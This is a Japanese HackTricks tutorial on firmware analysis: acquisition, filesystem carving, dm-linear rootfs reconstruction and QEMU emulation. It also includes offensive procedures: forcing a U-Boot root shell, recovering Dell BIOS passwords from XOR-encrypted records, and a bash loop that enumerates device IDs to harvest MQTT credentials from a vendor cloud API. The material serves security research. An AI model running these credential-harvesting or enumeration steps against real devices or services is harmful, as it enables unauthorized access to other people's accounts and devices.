# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **はじめに**

### 関連リソース

公開されているハードウェアインターフェースから取得する方法については、[UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) と [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) を参照してください。コンソールにアクセスする前に、起動時のUARTを再現可能な方法でキャプチャするには、[SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) を参照してください。

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理および仲介することで、デバイスを正しく動作させるための不可欠なソフトウェアです。永続メモリに保存されているため、デバイスの電源を入れた瞬間から重要な命令にアクセスでき、オペレーティングシステムの起動につながります。ファームウェアの調査や変更は、セキュリティ上の脆弱性を特定するための重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成や使用技術を理解するための重要な初期段階です。このプロセスでは、次の情報を収集します。

- CPUアーキテクチャと実行するオペレーティングシステム
- ブートローダーの仕様
- ハードウェアの構成とデータシート
- コードベースのメトリクスとソースの場所
- 外部ライブラリとライセンスの種類
- アップデート履歴と規制関連の認証
- アーキテクチャ図とフロー図
- セキュリティ評価と特定済みの脆弱性

この目的には、**オープンソースインテリジェンス（OSINT）**ツールが非常に役立ちます。また、利用可能なオープンソースソフトウェアコンポーネントを手動および自動のレビュープロセスで分析することも重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などのツールでは、潜在的な問題の発見に活用できる無料の静的解析を利用できます。

## **ファームウェアの取得**

ファームウェアはさまざまな方法で取得できます。方法によって複雑さは異なります。

- 開発者やメーカーなどの提供元から**直接取得**する
- 提供された手順に従って**ビルド**する
- 公式サポートサイトから**ダウンロード**する
- ホストされているファームウェアファイルを見つけるために **Google dork** クエリを使用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などのツールを使い、**クラウドストレージ**に直接アクセスする
- 中間者攻撃の手法で**アップデート**を傍受する
- **UART**、[**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash)、または **PICit** などを介してデバイスから**抽出**する
- デバイスの通信を監視し、アップデート要求を**スニッフィング**する
- **ハードコードされたアップデートエンドポイント**を特定して使用する
- ブートローダーやネットワークから**ダンプ**する
- 他の方法が使えない場合、適切なハードウェアツールを使ってストレージチップを**取り外して読み取る**

### UARTログのみの場合: フラッシュ内のU-Boot envを使ってroot shellを強制起動する

UART RXが無視される（ログのみが出力される）場合でも、**U-Boot環境変数のblobをオフラインで編集**することで、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8クリップとプログラマー（3.3V）を使ってSPI flashをダンプします。
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を追加し、**blobのU-Boot env CRC32を再計算**します。
3. env partitionのみを再フラッシュして再起動すると、UARTにshellが表示されます。

これは、bootloader shellは無効になっているものの、外部flashアクセスでenv partitionを書き換えられる組み込みデバイスで役立ちます。

## firmwareの解析

**firmwareを入手したら**、どのように扱うかを判断するため、情報を抽出する必要があります。そのために使えるツールはいくつかあります。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

それらのツールであまり見つからない場合は、`binwalk -E <bin>` でイメージの**エントロピー**を確認してください。エントロピーが低ければ、暗号化されている可能性は低いでしょう。高ければ、暗号化されている可能性が高いです（または何らかの方法で圧縮されています）。

さらに、これらのツールを使って**ファームウェア内に埋め込まれたファイル**を抽出できます。


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または、ファイルを調べるには[**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))を使用できます。

### 外部フラッシュ内の生のディスプレイアセット

外部SPIダンプが、必ずしもMCUの実行可能ファームウェアとは限りません。Cortex-Mターゲットでは、候補となる各コード領域の先頭をデバイスのメモリマップと照合してください。通常のベクターテーブルは、妥当なSRAMスタックポインターと、実行可能メモリ内のリセットハンドラーアドレスで始まります。オフセット0にベクターテーブルがないからといって、チップ全体にコードがないとは限りません。他のオフセットとブート構成も調べてください。`binwalk`でコンテナーが見つからない場合は、生のバイト列を調べ、[デコードしたSPIキャプチャ](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer)から取得したフラッシュ読み出しアドレスと、新しい画面を読み込む操作を関連付けてください。<sup>[[14]](#references)</sup>

ディスプレイアセット領域では、PNG/JPEGと決めつけず、候補となるピクセル形式と寸法を試してください。引用したデバイスでは**80×160 RGB565 little-endian**のフレームが使われていました。1ピクセルあたり2バイトなので、1フレームは**25,600バイト**（25 KiB）であり、24キロビットではありません。デコードしたフラッシュ読み出しアドレスから画面アセットのオフセットを特定し、研究者は`ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`で用意した画像を変換し、元のダンプ内にある同じサイズのアセットを置き換え、`flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`で書き込んで、ディスプレイに新しい画像が表示されることを確認しました。これは書き換え可能な*外部ディスプレイアセット*の例であり、MCUの内部ファームウェアを抽出または再書き込みしたものではありません。書き込みを行う前に、元のダンプを保管し、寸法、バイト順、オフセット、置換データの長さを確認してください。<sup>[[14]](#references)</sup>

### 差分フラッシュ解析と復元可能なXORシークレットストア

ファームウェア設定の保存形式が文書化されていない場合は、まず条件を揃えてフラッシュを複数回読み取り、設定を**1つだけ**変更してから、チップ全体を再度ダンプし、オフセットを比較してください。値を管理して実験を繰り返すことで、その設定に由来する変更とカウンターや書き込みメタデータを区別できます。データが同じ位置ではなく新しいオフセットに現れる場合、追記専用またはログ構造のストアであることを示しています。削除済みまたはtombstone化されたエントリーも残してください。ペイロードのバイト列を復元できる場合があります。<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

領域を特定したら、`binwalk` などのツールでファームウェアモジュールを抽出し、Ghidraでwriter/validatorをリバースエンジニアリングします。暗号文のパターンだけから方式を推測せず、コードでフィールド境界、padding、key indexing、key derivationを確認してください。<sup>[[12]](#references)</sup>

#### 暗号化されたゼロpaddingからkeyを復元する

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption)で説明したように、既知平文から同じオフセットのkeystream bytesが判明します。固定サイズのフィールドでは、ゼロpaddingが繰り返しXOR keyのすべてのインデックスを覆う場合、特に情報が露呈します。`0x00 XOR key_byte = key_byte`となるため、暗号化されたpaddingからkey bytesを直接読み取れます。すべてのkey indexが網羅されていれば、暗号文の末尾からkeyを復元し、値が設定されたbytesを復号できます。<sup>[[12]](#references)</sup>

Dellの脆弱なDVAR BIOS-password形式は具体例です。32-byteフィールドのbyte `0`は平文で、bytes `1..31`には20-byteの繰り返しkeyが使われています。<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

パスワードの長さが `L` の場合、XOR 前は位置 `L..31` がゼロでした。`L <= 12` なら、これらの位置がすべてのキーインデックスを網羅するため、brute force を使わずにキー全体とパスワードを復元できます。<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 過去の記録からキーを取り出す

各レコードを個別に解析してはいけません。DVARキーはおおよそ `modified_md5(device_seed || variable_GUID || password[0])` から導出されます。device seedとGUIDは固定されており、パスワードに依存する入力は平文の先頭1バイトだけです。つまり、デバイスごとのキーは最大256個で、先頭バイトが同じレコードは同じキーを共有します。有効なレコードと削除済みのレコードをそのバイトごとにグループ化してください。短い過去のレコードは、パディングによって完全なキーをleakすることがあり、そのキーで、パディングだけでは不十分な現在の長いレコードを復号できます。そのため、古い暗号文を消去せずにtombstone化すると、パスワードのローテーションによって露出が増える可能性があります。<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn)ツールはDVARを特定し、候補レコードを検証してパスワードを復元し、保存された生データやキーのバイト列を表示できます。checkoutからビルドし、検証済みのフラッシュイメージを次のようにスキャンします。<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

カスタムパーサーでは、レコード構造、印字可能文字の制約、ゼロパディングの確認、鍵のエントロピー、鍵がラップする箇所の一貫性を使って誤検出を排除します。繰り返し取得したダンプで、書き込みごとのビット反転がまばらに見られる場合は、観測されたマスクを列挙し、これらの制約に基づいて修正候補を順位付けします。ただし、ヒューリスティックな出力を正確な復元結果として示すのではなく、判別できない文字を報告してください。<sup>[[12]](#references)</sup>

パスワード検証情報には、復号可能な暗号文ではなく、salt付きの反復処理を施した一方向ハッシュを保存してください。また、ログ構造型ストアでは、上書きされた古い秘密情報を安全に削除してください。<sup>[[12]](#references)</sup>

### ファイルシステムの取得

先ほど説明した `binwalk -ev <bin>` などのツールを使えば、**ファイルシステムを抽出**できているはずです。\
Binwalkは通常、ファイルシステムの種類を名前にした**フォルダー**内に抽出します。一般的な種類は、squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfsです。

#### ファイルシステムの手動抽出

場合によっては、binwalkのシグネチャに**ファイルシステムのマジックバイトが含まれていない**ことがあります。その場合は、binwalkで**ファイルシステムのオフセットを特定し、バイナリから圧縮されたファイルシステムを切り出して**、以下の手順に従い、種類に応じて**手動で抽出**してください。

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs ファイルシステムをカービングするため、以下の **dd command** を実行します。

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

または、次のコマンドも実行できます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

実行後、ファイルは "`squashfs-root`" ディレクトリに格納されます。

- CPIO アーカイブファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 分割された組み込み root ファイルシステムの再構築

raw eMMC/SSD ダンプに有効なファイルシステムヘッダーが含まれているものの、そのメタデータのオフセットが公称パーティションの範囲を超えている場合、すぐに破損と判断しないでください。組み込みのブートコードは Device Mapper を使って複数の物理範囲から実際の root デバイスを構成することがあるため、GPT パーティションを1つだけ切り出すと最初のセグメントしか得られません。<sup>[[9]](#references)</sup>

#### メディアイメージ全体をトリアージする

まず、取得処理が完了していること、サイズが安定していること、イメージを保持している書き込みプロセスがないことを確認してください。ファイル名に開始/終了アドレスが含まれている場合は、その範囲を実際のバイト数と比較してください。GPT を読み取り専用モードで復元し、必要な範囲だけをアタッチしてください。ワークステーション上の信頼できない物理ボリュームに対して `vgchange -ay` を実行してはいけません。ボリュームグループの衝突や意図しない書き込みが発生する可能性があります。<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

元の init ロジックまたは LVM stack がイメージ全体を必要とする場合は、使い捨ての VM を使用してください。標準の boot partition に残された過去の boot log は特に有用です。bootloader が proprietary-container のオフセット、コンポーネントの長さ、slot selection、alignment rules、signature verification を記録している場合があります。これらの値を使って、埋め込まれた command line/kernel/initramfs を切り出し、それぞれの出力を `file`、magic bytes、`binwalk` で個別に検証します。container の末尾まで読み込むと、initrd、ACPI object、または signature が誤って kernel に追加されることがあります。<sup>[[9]](#references)</sup>

#### boot-time block map の復元

kernel の initramfs を抽出し、その `/init` と storage library をリバースエンジニアリングします。[Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) では、`/proc/cmdline`、`/dev/mapper/`、`dmsetup`、`BLKGETSIZE64`、partition path への string reference をたどり、アクティブな A/B slot を選択して table を構築するコードを追跡します。radare2 での有用な開始点は `r2 -A init`、`afl`、`pdf @ main`、`pdf @ fcn.xxxxx` です。<sup>[[9]](#references)</sup>

linear target は、仮想デバイスの連続した範囲を、1 つ以上の backing device の範囲にマッピングします。復元した 2 セグメントの table は、一般に次のような形式になります（すべての位置と長さは 512-byte sector 単位です）。<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

機械語の算術演算を、整数幅、シフト、単位変換も含めて正確に再現してください。たとえば、次の式はバイト単位のサイズをまず4 KiB境界に切り下げてから、512バイト単位のセクターに変換します。これを `p4_bytes // 512` に置き換えると、パーティションがページ境界に揃っていない場合、選択される末尾が `p4_bytes % 4096` だけずれます。<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

テーブルの順序に従って範囲を上限付きのチャンクでコピーし、メディアダンプ全体をメモリに読み込まずにフラットな解析イメージを再構築します。これにより、ホスト側に mapper デバイスを作成することも避けられます。GPT から導出したオフセット、反転したセクタ数、最終的な出力長は、それぞれ別個にアサーションで確認してください。<sup>[[9]](#references)</sup>

#### 破損と一定の再構築エラーを見分ける

SquashFS では、`unsquashfs` を実行する前に、`hsqs` マジックを確認し、スーパーブロックのオフセット 40 にあるリトルエンディアンの 64 ビット `bytes_used` フィールドをデコードしてください。無関係な複数の構造で抽出に失敗する場合は、想定位置の前後に広い範囲を取り、構造的に有力な候補を必須としてください。たとえば、展開可能なメタデータブロック、連続する複数の有効なディレクトリエントリ、もっともらしい inode フィールド、inode 数と整合するルート inode、有効な整合性メタデータ構造などです。マジックが1つ一致しただけでは不十分です。<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

同じ符号付きデルタによって独立した構造（たとえばディレクトリメタデータとverityレコード）が有効になる場合、欠落バイトではなく、セグメント開始位置の系統的な誤りが原因である可能性が高いです。孤立データの復元やファイルシステムメタデータの修正を試みる前に、逆算に戻り、切り捨てられた余り、符号の扱い、オーバーフロー、セクター／ページ単位の丸めを確認してください。<sup>[[9]](#references)</sup>

最後に、保護境界を分けて考えてください。TPMで封印されたLUKSボリュームはデータの機密性を保護する一方、署名付きdm-verityマッピングはrootファイルシステムの完全性を保護します。ソフトウェアTPMでは、元の物理TPMに封印されたキーを復元できません。また、verity検証を省略する研究専用initを使って改変したSquashFSを起動しても、署名を偽造したことにも、dm-verityを破ったことにもなりません。<sup>[[9]](#references)</sup>

## ファームウェアの分析

ファームウェアを入手したら、その構造や潜在的な脆弱性を理解するために分析することが不可欠です。この作業では、さまざまなツールを使ってファームウェアイメージを解析し、価値のあるデータを抽出します。

### 初期分析ツール

バイナリファイル（`<bin>`と表記）を初期調査するためのコマンドをいくつか紹介します。これらのコマンドは、ファイル形式の特定、文字列の抽出、バイナリデータの分析、パーティションやファイルシステムの詳細の把握に役立ちます。

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

イメージの暗号化状態を評価するには、`binwalk -E <bin>`で**エントロピー**を確認します。エントロピーが低ければ暗号化されていない可能性が高く、エントロピーが高ければ暗号化または圧縮されている可能性があります。

**埋め込みファイル**を抽出するには、**file-data-carving-recovery-tools**のドキュメントや、ファイルを検査するための**binvis.io**などのツールやリソースが推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>`を使うと、通常はファイルシステムを抽出できます。多くの場合、ファイルシステムの種類にちなんだ名前（例：squashfs、ubifs）のディレクトリに展開されます。ただし、magic bytesが欠落しているために**binwalk**がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。これには、`binwalk`でファイルシステムのオフセットを特定し、続いて`dd`コマンドでファイルシステムを切り出す方法があります。

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するための異なるコマンドを使用します。

### ファイルシステム分析

ファイルシステムを抽出したら、セキュリティ上の欠陥の調査を開始します。安全でないネットワークデーモン、ハードコードされた認証情報、APIエンドポイント、アップデートサーバーの機能、未コンパイルのコード、起動スクリプト、オフライン分析用のコンパイル済みバイナリに注意を払います。

調査対象となる**主な場所**と**項目**は次のとおりです。

- ユーザー認証情報を調べるための **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL 証明書と鍵
- 脆弱性の可能性がある設定ファイルとスクリプトファイル
- さらなる分析を行うための組み込みバイナリ
- 一般的な IoT デバイスの Web サーバーとバイナリ

ファイルシステム内の機密情報や脆弱性を発見するには、次のようなツールが役立ちます。

- 機密情報の検索には [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的なファームウェア分析には [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 静的および動的分析には [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方について、脆弱性がないか精査する必要があります。Unix バイナリ向けの **checksec.sh** や Windows バイナリ向けの **PESecurity** などのツールを使うと、悪用される可能性のある保護されていないバイナリを特定できます。

## 派生 URL トークンを介した cloud config と MQTT 認証情報の取得

多くの IoT ハブは、次のような cloud endpoint からデバイスごとの設定を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア分析中に、`<token>` がハードコードされた secret を使って device ID からローカルで導出されていることが判明する場合があります。例:

- token = MD5( deviceId || STATIC_KEY )。大文字の hex で表現される

この設計では、deviceId と STATIC_KEY を知っている人なら誰でも URL を再構築して cloud config を取得でき、多くの場合、平文の MQTT 認証情報や topic prefix が明らかになります。

実践的な手順:

1) UART の起動ログから deviceId を抽出する

- 3.3V UART アダプター（TX/RX/GND）を接続し、ログを取得します。

```bash
picocom -b 115200 /dev/ttyUSB0
```

- クラウド設定URLのパターンとブローカーアドレスを出力している行を探します。例:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) ファームウェアから STATIC_KEY と token のアルゴリズムを特定する

- バイナリを Ghidra/radare2 に読み込み、設定パス（"/pf/"）または MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例：MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、digest を大文字にする：

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud configとMQTT credentialsを収集する

- URLを組み立て、curlでJSONを取得し、jqで解析してsecretを抽出します。

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 平文 MQTT と脆弱な topic ACL を悪用する（存在する場合）

- 回収した認証情報を使ってメンテナンス用トピックを subscribe し、機密性の高いイベントを探す:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 予測可能な device ID を列挙する（大規模に、許可を得たうえで）

- 多くのエコシステムでは、vendor OUI/product/type bytes の後に連番の suffix が付加されています。
- 候補 ID を順に試し、token を導出して、プログラムから config を取得できます。

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notes
- 大量の列挙を試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、ターゲットハードウェアを変更せずに秘密情報を復元するため、emulationまたはstatic analysisを優先してください。


firmwareをemulateすることで、デバイスの動作または個々のプログラムの**dynamic analysis**が可能になります。この方法では、ハードウェアやアーキテクチャへの依存が課題となる場合がありますが、root filesystemまたは特定のバイナリを、Raspberry Piのようなアーキテクチャとエンディアンが一致するデバイス、あるいは構築済みの仮想マシンに移すことで、さらなるテストを行えます。

### 個々のバイナリのEmulating

単一のプログラムを調べる場合は、そのプログラムのエンディアンとCPUアーキテクチャを特定することが重要です。

#### MIPSアーキテクチャの例

MIPSアーキテクチャのバイナリをemulateするには、次のコマンドを使用します。

```bash
file ./squashfs-root/bin/busybox
```

また、必要なエミュレーションツールをインストールするには:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS（ビッグエンディアン）では `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` を使用します。

#### ARM Architecture Emulation

ARM バイナリの場合も同様の手順で、エミュレーションには `qemu-arm` エミュレータを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールは、ファームウェア全体のエミュレーションを可能にし、プロセスを自動化して動的解析を支援します。

### エミュレーション用に分割・検証済みのルートファイルシステムを再構築する

SquashFS の superblock は読み取れるものの、inode、ディレクトリ、fragment table のオフセットが不正と思われる場合は、すぐに `unsquashfs` にパッチを当てないでください。初期ブートバイナリをリバースエンジニアリングし、そこで作成されるブロックデバイスの構成を再現します。組み込みシステムでは、名目上のルートパーティションを公開しつつ、別のパーティションから借りたセクタを追加する `dm-linear` マッピングによって、実際のファイルシステムを構築することがあります。superblock のみを確認する検査には成功しても、それ以降のすべてのメタデータブロックがずれている場合があります。<sup>[[11]](#references)</sup>

ファームウェアの算術処理を正確に再現してください。特に、長さの単位がバイト、512 バイトセクタ、4 KiB ページのいずれなのかを特定し、シフトと切り捨てを元の順序で再現するとともに、A/B レイアウトでバンクに応じて変化する末尾領域を考慮します。たとえば `(partition_bytes >> 12) << 3` は、まず 4 KiB 境界で切り捨ててから、結果を 512 バイトセクタ単位で表します。これを `partition_bytes // 512` に置き換えると、追加される領域が数キロバイトずれ、後続の SquashFS テーブルがすべて破損する可能性があります。<sup>[[11]](#references)</sup>

次の検証手順が有効です。<sup>[[11]](#references)</sup>

1. 検証/init バイナリから、各 `dm-linear` セグメントのソースデバイス、開始セクタ、長さを特定します。
2. アラインメントの扱いを変えずに、各領域を連結するかマッピングします。
3. それでも展開に失敗する場合は、予測した境界の周辺にある小さな範囲だけを検索し、もっともらしい superblock だけで判断せず、連続する複数の有効なメタデータ構造があることを確認します。
4. 再構築したイメージに、変更していない `unsquashfs` を実行します。すべてのディレクトリと fragment を正常にたどれることは、`unsquashfs -stat` より強い根拠になります。

#### Analyst-controlled dm-verity replacement

解析者が QEMU のカーネル、initramfs、仮想ディスクを制御できる場合、ベンダーの検証用 PID 1 を小さな静的リンク済み init に置き換えることで、変更したルートを起動できます。これは**ラボでのブートチェーン置換**であり、dm-verity、その RSA 署名、Secure Boot、TPM で封印された鍵を破るものではありません。<sup>[[11]](#references)</sup>

置き換える init では、元のブート手順の実運用上の処理を再現します。`devtmpfs` をマウントし、`setsid()` を呼び出し、`/dev/console` をファイルディスクリプタ 0〜2 に接続し、`/proc` と `/sys` をマウントして、指定されたブロックデバイスを待ちます。次に、編集したルートを読み取り専用でマウントし、古いルートの疑似ファイルシステムを切り離し、新しいマウントを `/` に移動してから、`chroot` し、ファームウェア本来の `/sbin/init` を `execve()` します。`MS_MOVE` の**前に** `/dev`、`/proc`、`/sys` を切り離すと、新しいルートに属するマウントポイントまで誤って切り離す事態を避けられます。<sup>[[11]](#references)</sup>

変更した不変ルートとは別に、変更可能なデバイス状態を保持します。qcow2 オーバーレイで元のディスクの LVM 状態を保持し、2 台目の読み取り専用 virtio ディスクから編集済み SquashFS を提供できます。<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### オフラインでのイメージ状態のデバッグ

起動が遅い場合、破壊的な起動スクリプトがある場合、またはコンソールログが不安定で障害の原因を特定しにくい場合は、guest の外部から永続状態を調査します。実行中の VM が使用している overlay を決して接続しないでください。`qemu-nbd` で公開し、LVM の検出対象を目的の NBD パーティションに限定してから、切断する前にボリュームグループを非アクティブ化します。<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

再現性のある fault isolation を行うには、書き込み可能な安定したボリュームにタイムスタンプ付きの marker file を書き込み、オフラインで検証します。`/dev/kmsg`、FIFO、一時的なコンソールでは、レート制限やプロセスの早期終了により false negative が発生することがあります。また、無関係なコードを変更する前に、各レイヤー間のインターフェースを正確に比較してください。たとえば、`uname -r` と `/lib/modules/`、ディスク上の ext4 の機能とカーネル設定、Mesa の `libGL` の世代と DRI driver ABI、PCI から特定されるドライバー名を比較します。コンポーネントが存在し、`dlopen()` に成功しても、利用側が異なる ABI を想定しているために使用できない場合があります。<sup>[[11]](#references)</sup>

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境を分析に使用します。OS とファイルシステムへの shell access を維持することが不可欠です。エミュレーションではハードウェアとのやり取りを完全に再現できない場合があるため、エミュレーションの再起動が必要になることがあります。分析では、ファイルシステムを再確認し、公開されている Web ページやネットワークサービスを exploit し、bootloader の脆弱性を調査します。潜在的な backdoor の脆弱性を特定するには、ファームウェアの integrity test が重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などのツールを使い、動作環境内のプロセスやバイナリを調べます。breakpoint の設定や fuzzing などの手法によって、脆弱性を特定します。

完全な debugger がない embedded target では、**静的リンクされた `gdbserver` をデバイスにコピーし、リモートから接続します**。<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processorのメッセージマッピング

IoTハブでは、RFスタックが**radio MCU**とLinuxのユーザーランドプロセスに分割されていることがよくあります。有用なワークフローは、次の経路をマッピングすることです。<sup>[[8]](#references)</sup>

1. 無線上の**RFフレーム**
2. radio MCU上の**コントローラー側パーサー**
3. Linuxに転送される**シリアル/UARTテキストまたはTLVプロトコル**（例: `/dev/tty*`）
4. メインデーモン内の**アプリケーションディスパッチャー**
5. **プロトコル固有のハンドラー / ステートマシン**

このアーキテクチャでは、リバース対象が1つではなく2つになります。コントローラーがバイナリ無線フレームを`Group,Command,arg1,arg2,...`のようなテキストプロトコルに変換する場合、次の項目を特定します。

- **メッセージグループ**とディスパッチテーブル
